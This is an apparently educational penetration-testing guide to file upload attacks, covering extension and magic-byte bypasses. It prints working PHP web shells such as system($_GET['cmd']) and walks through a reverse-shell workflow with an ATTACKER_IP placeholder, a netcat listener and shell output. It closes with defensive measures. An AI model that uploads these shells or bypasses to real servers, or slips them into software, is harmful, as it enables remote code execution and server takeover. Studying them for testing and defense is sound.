# File Upload Attacks: 

## Main Headers : 
- File Name
- File Type
- Magic Number 
- File Content
- File Size

## Blacklist : 
- bypass via Case senistive
- (Apache - linux) --> .pht
- (IIS - Windows) --> .asa , .cer
- .emlto trigger stored xss in internet explorer only.

## Whitelist : 
- file.jpg.php
- Null byte injection : shell.php%001.jpg , shell.php\x00.jpg
- .svg --> xxe , xss
- ssrf in ffmpeg lib.
- ../../../index.php --> in File Name
- validating file content and let file name (شوف الكونتنت اللي متغيرش بعد الرفع بالهيكس وقارن الثابت وبدله ب الكود بتاعك)
- Image tragic attack --> image over {payload}.
- The file magic number is a png but the file is shell, this trick to bypass the content : GIF89a;<?php..>
- RCE via zip files
- OOB SQL in filename

## Automation :
- Upload scanner on burp.

  ---
# File Upload Attacks — Complete Guide

## Introduction
File upload functionality is a common feature in modern web applications. Users upload images, documents, or other files, and the server stores them for later use. However, if this functionality is not properly secured, it can be abused by attackers to upload malicious files such as **web shells** or **reverse shells**, which may lead to full system compromise.

This document covers:
- File upload validation mechanisms (client-side and server-side).
- Techniques to bypass upload restrictions.
- Web shells and reverse shells (with examples).
- Practical exploitation workflow.
- Tools and scripts that help in testing.
- Defensive measures for secure file handling.

---

## 1 — File Upload Security Mechanisms

When a file is uploaded, the server usually applies several checks to prevent malicious uploads. Common methods include:

### 1.1 Client-side validation
- Implemented in JavaScript or HTML forms (e.g., `accept=".jpg,.png"`).
- Easy to bypass by intercepting and modifying requests (e.g., via **Burp Suite**).

### 1.2 Server-side validation
- **Blacklist**: Reject certain extensions like `.php` or `.exe`. This is weak because attackers can find alternative extensions.
- **Whitelist**: Allow only specific extensions like `.jpg`, `.png`. Stronger, but may be implemented incorrectly.
- **Content-Type header**: Check the MIME type (`image/jpeg`). Can be faked by modifying the request.
- **Magic bytes (file signature)**: Inspect first bytes of file to verify type (e.g., GIF starts with `GIF8`). More reliable but still bypassable.

---

## 2 — Bypassing File Upload Restrictions

### 2.1 Client-side bypass
- Intercept request with Burp.
- Change filename, extension, or Content-Type.

### 2.2 Blacklist bypass
- Change extension casing: `shell.pHp`.
- Use alternative PHP extensions: `.phtml`, `.phar`, `.php5`, `.php7`, `.pht`.
- Fuzz extensions with Burp Intruder and wordlists from **SecLists**.

### 2.3 Whitelist bypass
- **Double extensions**: `shell.jpg.php`, `shell.php.jpg`.
- **Misconfigurations**: On Apache, a file with `.php` anywhere in its name may be executed.
- **Character injection**: Add `%00` (null byte), `%20` (space), `%0a` (newline), `:` or `.` before/after extension.

### 2.4 Content-Type header bypass
- Change Content-Type in request body from `image/jpeg` to anything acceptable.

### 2.5 MIME / Magic bytes bypass
- Add fake magic bytes at beginning of file.
- Example: PHP script starting with `GIF8` so server sees it as image:
  ```php
  GIF8
  <?php system($_GET['cmd']); ?>
  ```

---

## 3 — Web Shells

### What is a Web Shell?
A script uploaded to the server that executes commands via HTTP requests.

### Example PHP Web Shell:
```php
<?php system($_REQUEST['cmd']); ?>
```

### Usage:
```
http://target/uploads/shell.php?cmd=whoami
```

### Advantages:
- Works even if outbound connections are blocked.
- Simple to use with a browser.

### Disadvantages:
- Not interactive.
- Each command must be run separately.
- Restricted if `system()` or `exec()` functions are disabled.

---

## 4 — Reverse Shells

### What is a Reverse Shell?
A script that makes the server connect back to the attacker, giving an interactive shell.

### Pentestmonkey PHP Reverse Shell Example:
```php
$ip = 'ATTACKER_IP';
$port = ATTACKER_PORT;
```

### Steps:
1. Edit script with attacker IP and port.
2. Start netcat listener:
   ```bash
   nc -lvnp ATTACKER_PORT
   ```
3. Upload reverse shell to server.
4. Access uploaded script in browser.
5. Get interactive shell:
   ```bash
   connect to [ATTACKER_IP] from [VICTIM_IP]
   # id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

### Advantages:
- Fully interactive.
- Easier for privilege escalation.

### Disadvantages:
- Requires outbound connections.
- Firewalls may block traffic.

---

## 5 — Choosing Between Web Shell and Reverse Shell
- **Prefer reverse shells**: More control and interactivity.
- **Use web shells**: When reverse shells fail due to firewall restrictions or disabled functions.

---

## 6 — Tools and Payload Sources
- **SecLists**: File extensions, payloads, wordlists.
- **PayloadsAllTheThings**: Upload bypass techniques.
- **Pentestmonkey**: Reverse shells.
- **phpbash**: Interactive web shell.

---

## 7 — Workflow for Exploiting File Uploads
1. Identify upload functionality and test allowed extensions.
2. Try bypass techniques (double extension, null byte, MIME trick).
3. Upload test web shell (simple command execution).
4. If successful, escalate to reverse shell.
5. Use shell for post-exploitation (enumeration, privilege escalation).

---

## 8 — Defensive Measures
- Validate on server-side with strict whitelisting.
- Use regex to validate filenames properly (e.g., `/^.*\.(jpg|jpeg|png|gif)$/i`).
- Validate MIME type with `finfo_file()`.
- Store files outside webroot.
- Rename files to random names and remove original extensions.
- Deny execution in upload directories (e.g., Apache `SetHandler none`).
- Limit size of uploads.
- Use antivirus or sandboxing for uploaded files.

---

## 9 — Conclusion
File upload vulnerabilities are extremely powerful and dangerous. Exploiting them allows attackers to execute arbitrary code on the server using **web shells** or **reverse shells**. A penetration tester must know multiple bypass techniques to handle various protections. From a defense perspective, implementing strict validation, non-executable storage, and strong file handling policies is essential to mitigate the risk.

---

## 10 — References
- SecLists: https://github.com/danielmiessler/SecLists
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- Pentestmonkey Reverse Shells: http://pentestmonkey.net/tools/web-shells
- phpbash: https://github.com/Arrexel/phpbash


